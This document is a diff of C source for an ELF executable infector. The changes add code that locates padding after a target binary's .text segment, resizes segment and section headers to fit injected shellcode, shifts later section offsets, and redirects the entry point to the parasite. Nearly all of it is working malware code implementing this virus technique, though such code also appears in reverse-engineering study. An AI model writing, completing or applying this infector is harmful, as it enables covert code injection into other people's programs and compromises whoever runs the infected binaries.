@@ -9,8 +9,6 @@
 #include <sys/stat.h>
 #include <sys/mman.h>
 
-
-
 static int shellcode_patch_ret_address(struct Shellcode *this,  \
         Elf64_Addr addr)
 {
@@ -50,15 +48,35 @@ err1:
     return -1;
 }
 
-static int target_adjust_sections(Target *this)
+/* to adjust section headers and other offsets */
+static void target_adjust_sections(Target *this)
 {
-
+    this->m_elf->m_ehdr->e_entry = this->parasite_addr;
+    for(int i = 0; i < this->m_elf->m_ehdr->e_shnum; i++){
+        if(this->m_elf->m_shdr[i].sh_addr > this->parasite_addr){
+            /* 
+             * increase offset of every section after infected one
+             * by PAGE_SIZE
+             */
+            this->m_elf->m_shdr[i].sh_offset += PF_HP_PAGE_SIZE;
+        } else {
+            /* 
+             * if sh_addr + sh_size == parasite_addr, we are at 
+             * .text section. since we havent modified section
+             * header's values such as sh_size, we should do that
+             * now
+             */
+            if(this->m_elf->m_shdr[i].sh_addr + this->m_elf->   \
+                    m_shdr[i].sh_size == this->parasite_addr){
+                this->m_elf->m_shdr[i].sh_size +=               \
+                    this->parasite_size;
+            }
+        }
+    }
 }
 
-/*
- * find free space in target binary
- */
-static int target_find_free_space(Target *this, int parasite_size)
+/* find free space in target binary */
+static int target_find_free_space(Target *this)
 {
     bool text_found = false;
     for(int i = 0;i < this->m_elf->m_ehdr->e_phnum; i++){
@@ -71,18 +89,19 @@ static int target_find_free_space(Target *this, int parasite_size)
             this->parasite_addr = this->m_elf->m_phdr[i].       \
                 p_vaddr + this->text_filesize;
 
-            /* do this after injecting shellcode : resizing p_filesz and p_memsz */
-            this->m_elf->m_phdr[i].p_filesz += parasite_size;
-            this->m_elf->m_phdr[i].p_memsz += parasite_size;
+            /* resizing p_filesz and p_memsz */
+            this->m_elf->m_phdr[i].p_filesz += this->parasite_size;
+            this->m_elf->m_phdr[i].p_memsz += this->parasite_size;
             text_found = true;
 
         } else if (this->m_elf->m_phdr[i].p_type == PT_LOAD &&  \
             (this->m_elf->m_phdr[i].p_offset - this->text_end)  \
-            < parasite_size && text_found){
+            < this->parasite_size && text_found){
             this->available_freespace = this->m_elf->m_phdr[i]. \
                 p_offset - this->text_end;
             printf("segment found with a gap of %d\n", this->   \
                     available_freespace);
+            text_found = false;
         } else {
             fprintf(stderr, "failed to find free space to       \
                     inject shellcode\n");
@@ -96,15 +115,11 @@ err:
     return -1;
 }
 
-/*
- * to get the .text section code from our shellcode
- */
+/* to get the .text section code from our shellcode */
 static int elf_get_section_index_by_name(Elf *elf, const char   \
         *section_name)
 {
-    /* 
-     * first we have to parse shstrtab
-     */
+    /* first we have to parse shstrtab */
     Elf64_Shdr *section = &elf->m_shdr[elf->m_ehdr->e_shstrndx];
     char *shstrtab = (char *)&elf->m_map[section->sh_offset];
 
@@ -202,8 +217,7 @@ Elf *ElfConstructor(const char *filename)
     elf->InitFile = elf_init_file;
     elf->IsElf = elf_is_elf;
     elf->ParseHeaders = elf_parse_headers;
-    elf->FindSectionIndexByName =                       \
-        elf_get_section_index_by_name;
+    elf->FindSectionIndexByName = elf_get_section_index_by_name;
 
 err:
     return elf;
